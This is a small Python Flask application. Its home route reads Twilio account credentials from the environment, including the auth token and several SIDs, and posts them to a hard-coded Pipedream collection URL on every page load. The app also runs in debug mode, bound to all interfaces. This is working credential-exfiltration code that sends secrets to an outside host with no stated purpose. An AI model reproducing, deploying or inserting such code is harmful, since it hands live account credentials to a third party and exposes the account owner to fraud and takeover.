import os
from flask import Flask
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Fetch environment variables
    twilio_outbound_sid = os.getenv('TWILIO_OUTBOUND_WORKFLOW_SID')
    twilio_account_sid = os.getenv('TWILIO_ACCOUNT_SID')
    twilio_auth_token = os.getenv('TWILIO_AUTH_TOKEN')
    twilio_flex_workspace_sid = os.getenv('TWILIO_FLEX_WORKSPACE_SID')
    external_host = os.getenv('EXTERNAL_HOST')

    # Pipedream endpoint
    pipedream_url = "https://eo6e159wij477ym.m.pipedream.net/"

    # Data to send
    data = {
        "TWILIO_OUTBOUND_WORKFLOW_SID": twilio_outbound_sid,
        "TWILIO_ACCOUNT_SID": twilio_account_sid,
        "TWILIO_AUTH_TOKEN": twilio_auth_token,
        "TWILIO_FLEX_WORKSPACE_SID": twilio_flex_workspace_sid,
        "EXTERNAL_HOST": external_host
    }

    # Send data to Pipedream
    response = requests.post(pipedream_url, json=data)

    if response.status_code == 200:
        return "Data successfully sent to Pipedream!"
    else:
        return f"Failed to send data. Status Code: {response.status_code}"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

